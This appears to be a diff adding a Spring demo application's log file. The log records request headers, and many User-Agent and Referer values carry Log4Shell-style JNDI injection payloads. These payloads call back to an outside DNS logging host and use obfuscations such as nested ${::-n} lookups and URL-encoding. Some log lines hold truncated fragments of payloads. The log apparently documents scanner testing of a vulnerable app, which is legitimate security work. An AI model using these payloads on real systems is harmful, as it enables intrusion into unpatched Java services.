@@ -1,0 +1,125 @@
+2025-12-08 14:03:20 INFO  com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:03:20 INFO  com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+2025-12-08 14:03:20 ERROR com.example.spring.controller.IndexController - Hello, World
+2025-12-08 14:03:26 INFO  com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:03:26 INFO  com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36.%7dget$%7b::-.%7d127$%7b::-.%7d0$%7b::-.%7d0$%7b::-.%7d1$%7b::-.%7d8005$%7b::-.%7dUq1$%7b::-.%7dhpdth2$%7b::-.%7dceye$%7b::-.%7dio/ user
+2025-12-08 14:03:27 ERROR com.example.spring.controller.IndexController - Hello, World
+2025-12-08 14:03:50 INFO  com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:03:50 INFO  com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+2025-12-08 14:03:50 ERROR com.example.spring.controller.IndexController - Hello, 123
+2025-12-08 14:03:50 INFO  com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:03:50 INFO  com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{jndi:dns://1%24%7b::-.%7dget%24%7b::-.%7d127%24%7b::-.%7d0%24%7b::-.%7d0%24%7b::-.%7d1%24%7b::-.%7d8005%24%7b::-.%7dWfi%24%7b::-.%7dhpdth2%24%7b::-.%7dceye%24%7b::-.%7dio/%20user}
+2025-12-08 14:03:50 ERROR com.example.spring.controller.IndexController - Hello, ${jndi:dns://0${::-.}get${::-.}127${::-.}0${::-.}0${::-.}1${::-.}8005${::-.}Wfi${::-.}hpdth2${::-.}ceye${::-.}io/ user}
+2025-12-08 14:05:06 INFO  com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:05:06 INFO  com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+2025-12-08 14:05:06 ERROR com.example.spring.controller.IndexController - Hello, World
+2025-12-08 14:06:35 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:06:35 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+2025-12-08 14:07:16 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:07:16 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:07:16 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:07:16 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:07:16 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{j%24%7b::-n%7ddi:dns://1%24%7b::-.%7dget%24%7b::-.%7d127%24%7b::-.%7d0%24%7b::-.%7d0%24%7b::-.%7d1%24%7b::-.%7d8005%24%7b::-.%7dTOn%24%7b::-.%7d2%24%7b::-.%7d1%24%7b::-.%7dhpdth2%24%7b::-.%7dceye%24%7b::-.%7dio/%20user}
+2025-12-08 14:07:16 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{jndi:dns://1%24%7b::-.%7dget%24%7b::-.%7d127%24%7b::-.%7d0%24%7b::-.%7d0%24%7b::-.%7d1%24%7b::-.%7d8005%24%7b::-.%7dTVK%24%7b::-.%7d2%24%7b::-.%7d0%24%7b::-.%7dhpdth2%24%7b::-.%7dceye%24%7b::-.%7dio/%20user}
+2025-12-08 14:07:16 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36n%7ddi:dns://1$%7b::-.%7dget$%7b::-.%7d127$%7b::-.%7d0$%7b::-.%7d0$%7b::-.%7d1$%7b::-.%7d8005$%7b::-.%7dTOn$%7b::-.%7d3$%7b::-.%7d1$%7b::-.%7dhpdth2$%7b::-.%7dceye$%7b::-.%7dio/%20user
+2025-12-08 14:07:16 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36.%7dget$%7b::-.%7d127$%7b::-.%7d0$%7b::-.%7d0$%7b::-.%7d1$%7b::-.%7d8005$%7b::-.%7dTVK$%7b::-.%7d3$%7b::-.%7d0$%7b::-.%7dhpdth2$%7b::-.%7dceye$%7b::-.%7dio/%20user
+2025-12-08 14:11:28 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:11:28 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+2025-12-08 14:11:34 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:11:34 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+2025-12-08 14:11:48 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:11:48 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+2025-12-08 14:13:12 ERROR com.example.spring.controller.IndexController - Referer: 127
+2025-12-08 14:13:12 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+2025-12-08 14:13:30 ERROR com.example.spring.controller.IndexController - Referer: 127
+2025-12-08 14:13:30 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+2025-12-08 14:21:27 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:21:27 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+2025-12-08 14:21:33 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:21:33 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${jndi:dns://1.get.127.0.0.1.8005.dzu3.hpdth2.ceye.io/user}
+2025-12-08 14:24:53 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:24:53 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:24:53 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:24:53 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{jndi:dns://1.get.127.0.0.1.8005.ldY20.hpdth2.ceye.io/user}
+2025-12-08 14:24:53 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:24:53 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{j%24{::-n}di:dns://1.get.127.0.0.1.8005.YGL21.hpdth2.ceye.io/user}
+2025-12-08 14:24:53 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${jndi:dns://1.get.127.0.0.1.8005.ldY30.hpdth2.ceye.io/user}
+2025-12-08 14:24:53 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${j${::-n}di:dns://1.get.127.0.0.1.8005.YGL31.hpdth2.ceye.io/user}
+2025-12-08 14:27:10 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:27:10 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{jndi:dns://1%24%7b::-.%7dget%24%7b::-.%7d127%24%7b::-.%7d0%24%7b::-.%7d0%24%7b::-.%7d1%24%7b::-.%7d8005%24%7b::-.%7deCv%24%7b::-.%7d2%24%7b::-.%7d0%24%7b::-.%7dhpdth2%24%7b::-.%7dceye%24%7b::-.%7dio/%20user}
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{jn%24%7benv::-%7ddi:dns://1%24%7b::-.%7dget%24%7b::-.%7d127%24%7b::-.%7d0%24%7b::-.%7d0%24%7b::-.%7d1%24%7b::-.%7d8005%24%7b::-.%7dSmj%24%7b::-.%7d2%24%7b::-.%7d2%24%7b::-.%7dhpdth2%24%7b::-.%7dceye%24%7b::-.%7dio/%20user}
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36n%7ddi:dns://1$%7b::-.%7dget$%7b::-.%7d127$%7b::-.%7d0$%7b::-.%7d0$%7b::-.%7d1$%7b::-.%7d8005$%7b::-.%7dMZw$%7b::-.%7d3$%7b::-.%7d1$%7b::-.%7dhpdth2$%7b::-.%7dceye$%7b::-.%7dio/%20user
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{j%24%7b::-n%7ddi:dns://1%24%7b::-.%7dget%24%7b::-.%7d127%24%7b::-.%7d0%24%7b::-.%7d0%24%7b::-.%7d1%24%7b::-.%7d8005%24%7b::-.%7dMZw%24%7b::-.%7d2%24%7b::-.%7d1%24%7b::-.%7dhpdth2%24%7b::-.%7dceye%24%7b::-.%7dio/%20user}
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%7ddi:dns://1$%7b::-.%7dget$%7b::-.%7d127$%7b::-.%7d0$%7b::-.%7d0$%7b::-.%7d1$%7b::-.%7d8005$%7b::-.%7dSmj$%7b::-.%7d3$%7b::-.%7d2$%7b::-.%7dhpdth2$%7b::-.%7dceye$%7b::-.%7dio/%20user
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{j%24%7bsys:k5:-nD%7d%24%7blower:i%24%7bweb:k5:-:%7d%7ddns://1%24%7b::-.%7dget%24%7b::-.%7d127%24%7b::-.%7d0%24%7b::-.%7d0%24%7b::-.%7d1%24%7b::-.%7d8005%24%7b::-.%7d98G%24%7b::-.%7d2%24%7b::-.%7d3%24%7b::-.%7dhpdth2%24%7b::-.%7dceye%24%7b::-.%7dio/%20user}
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36nD%7d$%7blower:i$%7bweb:k5:-:%7d%7ddns://1$%7b::-.%7dget$%7b::-.%7d127$%7b::-.%7d0$%7b::-.%7d0$%7b::-.%7d1$%7b::-.%7d8005$%7b::-.%7d98G$%7b::-.%7d3$%7b::-.%7d3$%7b::-.%7dhpdth2$%7b::-.%7dceye$%7b::-.%7dio/%20user
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{%24{%24{::-j}%24{::-n}%24{::-d}%24{::-i}:dns://1%24%7b::-.%7dget%24%7b::-.%7d127%24%7b::-.%7d0%24%7b::-.%7d0%24%7b::-.%7d1%24%7b::-.%7d8005%24%7b::-.%7dMds%24%7b::-.%7d2%24%7b::-.%7d4%24%7b::-.%7dhpdth2%24%7b::-.%7dceye%24%7b::-.%7dio/%20user}
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${${${::-j}${::-n}${::-d}${::-i}:dns://1$%7b::-.%7dget$%7b::-.%7d127$%7b::-.%7d0$%7b::-.%7d0$%7b::-.%7d1$%7b::-.%7d8005$%7b::-.%7dMds$%7b::-.%7d3$%7b::-.%7d4$%7b::-.%7dhpdth2$%7b::-.%7dceye$%7b::-.%7dio/%20user}
+2025-12-08 14:27:25 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36.%7dget$%7b::-.%7d127$%7b::-.%7d0$%7b::-.%7d0$%7b::-.%7d1$%7b::-.%7d8005$%7b::-.%7deCv$%7b::-.%7d3$%7b::-.%7d0$%7b::-.%7dhpdth2$%7b::-.%7dceye$%7b::-.%7dio/%20user
+2025-12-08 14:28:38 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:28:38 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:28:38 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{jndi:dns://1.get.127.0.0.1.8005.2Wf20.hpdth2.ceye.io/%20user}
+2025-12-08 14:28:38 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${jndi:dns://1.get.127.0.0.1.8005.2Wf30.hpdth2.ceye.io/%20user}
+2025-12-08 14:29:11 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:29:11 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:29:11 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{jndi:dns://1.get.127.0.0.1.8005.Ue320.hpdth2.ceye.io/%20user}
+2025-12-08 14:29:11 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${jndi:dns://1.get.127.0.0.1.8005.Ue330.hpdth2.ceye.io/%20user}
+2025-12-08 14:30:19 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:30:19 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:30:19 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{j%24{::-n}di:dns://1.get.127.0.0.1.8005.Q0a21.hpdth2.ceye.io/ user}
+2025-12-08 14:30:19 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:30:19 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:30:19 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{jndi:dns://1.get.127.0.0.1.8005.49C20.hpdth2.ceye.io/ user}
+2025-12-08 14:30:19 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${jndi:dns://1.get.127.0.0.1.8005.49C30.hpdth2.ceye.io/ user}
+2025-12-08 14:30:19 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${j${::-n}di:dns://1.get.127.0.0.1.8005.Q0a31.hpdth2.ceye.io/ user}
+2025-12-08 14:31:15 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:31:15 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:31:15 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:31:15 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{j%24{::-n}di:dns://1.get.127.0.0.1.8005.T3s21.hpdth2.ceye.io/ user}
+2025-12-08 14:31:15 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:31:15 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{jndi:dns://1.get.127.0.0.1.8005.De620.hpdth2.ceye.io/ user}
+2025-12-08 14:31:15 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${jndi:dns://1.get.127.0.0.1.8005.De630.hpdth2.ceye.io/ user}
+2025-12-08 14:31:15 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${j${::-n}di:dns://1.get.127.0.0.1.8005.T3s31.hpdth2.ceye.io/ user}
+2025-12-08 14:31:41 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:31:41 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:31:41 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:31:41 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:31:41 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{jndi:dns://1.get.127.0.0.1.8005.cKd20.hpdth2.ceye.io/ user}
+2025-12-08 14:31:41 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{j%24{::-n}di:dns://1.get.127.0.0.1.8005.ShD21.hpdth2.ceye.io/ user}
+2025-12-08 14:31:41 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${jndi:dns://1.get.127.0.0.1.8005.cKd30.hpdth2.ceye.io/ user}
+2025-12-08 14:31:41 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${j${::-n}di:dns://1.get.127.0.0.1.8005.ShD31.hpdth2.ceye.io/ user}
+2025-12-08 14:32:58 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:32:58 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+2025-12-08 14:33:04 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:33:04 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${jndi:dns://1.get.127.0.0.1.8005.r8P3.hpdth2.ceye.io/ user}
+2025-12-08 14:33:53 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:33:53 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:33:53 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:33:53 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:33:53 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{jndi:dns://2.get.127.0.0.1.8005.OPY20.hpdth2.ceye.io/ user}
+2025-12-08 14:33:53 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{j%24{::-n}di:dns://2.get.127.0.0.1.8005.ewP21.hpdth2.ceye.io/ user}
+2025-12-08 14:33:53 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${jndi:dns://2.get.127.0.0.1.8005.OPY30.hpdth2.ceye.io/ user}
+2025-12-08 14:33:53 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${j${::-n}di:dns://2.get.127.0.0.1.8005.ewP31.hpdth2.ceye.io/ user}
+2025-12-08 14:34:37 ERROR com.example.spring.controller.IndexController - Referer: :%24{jndi:dns://2.get.127.0.0.1.8005.81P20.hpdth2.ceye.io/ user}
+2025-12-08 14:34:37 ERROR com.example.spring.controller.IndexController - Referer: :%24{j%24{::-n}di:dns://2.get.127.0.0.1.8005.apc21.hpdth2.ceye.io/ user}
+2025-12-08 14:34:37 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{jndi:dns://1.get.127.0.0.1.8005.81P20.hpdth2.ceye.io/ user}
+2025-12-08 14:34:37 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36%24{j%24{::-n}di:dns://1.get.127.0.0.1.8005.apc21.hpdth2.ceye.io/ user}
+2025-12-08 14:34:37 ERROR com.example.spring.controller.IndexController - Referer: :${jndi:dns://2.get.127.0.0.1.8005.81P30.hpdth2.ceye.io/ user}
+2025-12-08 14:34:37 ERROR com.example.spring.controller.IndexController - Referer: :${j${::-n}di:dns://2.get.127.0.0.1.8005.apc31.hpdth2.ceye.io/ user}
+2025-12-08 14:34:38 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${jndi:dns://1.get.127.0.0.1.8005.81P30.hpdth2.ceye.io/ user}
+2025-12-08 14:34:38 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${j${::-n}di:dns://1.get.127.0.0.1.8005.apc31.hpdth2.ceye.io/ user}
+2025-12-08 14:35:36 ERROR com.example.spring.controller.IndexController - Referer: null
+2025-12-08 14:35:36 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+2025-12-08 14:35:42 ERROR com.example.spring.controller.IndexController - Referer: :${jndi:dns://2.get.127.0.0.1.8005.1rk3.hpdth2.ceye.io/ user}
+2025-12-08 14:35:43 ERROR com.example.spring.controller.IndexController - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36${jndi:dns://1.get.127.0.0.1.8005.1rk3.hpdth2.ceye.io/ user}
